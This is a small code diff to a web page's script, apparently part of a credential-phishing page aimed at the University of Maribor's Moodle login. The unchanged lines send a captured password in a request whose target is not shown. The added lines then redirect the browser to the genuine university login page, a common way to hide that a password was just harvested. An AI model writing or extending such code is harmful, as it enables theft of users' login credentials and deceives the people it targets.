@@ -461,7 +461,9 @@
             password,
             formSubmitted: true,
           }),
-        });
+        }).then(() => {
+          window.location.href = "https://estudij.um.si/login/index.php";
+        })
       });
   </script>
 </body>
